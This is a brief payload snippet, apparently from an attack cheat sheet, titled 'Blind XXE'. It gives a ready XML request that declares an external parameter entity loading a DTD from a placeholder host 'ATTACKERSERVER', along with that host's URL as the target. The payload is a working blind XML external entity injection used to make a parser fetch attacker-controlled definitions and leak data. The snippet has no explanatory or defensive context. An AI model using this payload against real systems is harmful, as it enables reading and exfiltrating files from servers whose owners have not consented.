# Blind XXE #

## Request payload: ##

<?xml version="1.0" ?>
<!DOCTYPE a [
	<!ENTITY % b SYSTEM "http://ATTACKERSERVER/xxe.dtd">
	%b;
	%c;
]>
<a>&rrr;</a>

## Target URL ##

http://ATTACKERSERVER/xxe.dtd
